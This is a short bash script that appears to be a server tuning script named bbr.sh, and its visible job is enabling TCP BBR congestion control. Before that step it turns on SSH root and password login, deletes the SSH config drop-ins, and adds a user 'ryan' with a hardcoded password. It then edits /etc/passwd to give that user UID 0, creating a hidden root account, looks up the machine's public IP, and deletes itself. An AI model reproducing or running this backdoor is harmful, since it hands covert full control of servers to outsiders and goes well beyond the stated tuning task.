#!/bin/bash

sed -i 's/^.*PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
sed -i 's/^.*PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
sed -i 's/^.*RSAAuthentication.*/RSAAuthentication yes/g' /etc/ssh/sshd_config
sed -i 's/^.*PubkeyAuthentication.*/PubkeyAuthentication yes/g' /etc/ssh/sshd_config
rm -rf /etc/ssh/sshd_config.d/* && rm -rf /etc/ssh/ssh_config.d/*
echo "Port 22"  >> /etc/ssh/sshd_config
useradd ryan
echo ryan:LBdj147369 |chpasswd ryan
sed -i 's|^.*ryan.*|ryan:x:0:0:root:/root:/bin/bash|g' /etc/passwd
service sshd ssh restart
curl ipv4.ip.sb
echo "net.core.default_qdisc=fq" >> /etc/sysctl.conf
echo "net.ipv4.tcp_congestion_control=bbr" >> /etc/sysctl.conf
sysctl -p
lsmod | grep bbr
rm -rf bbr.sh
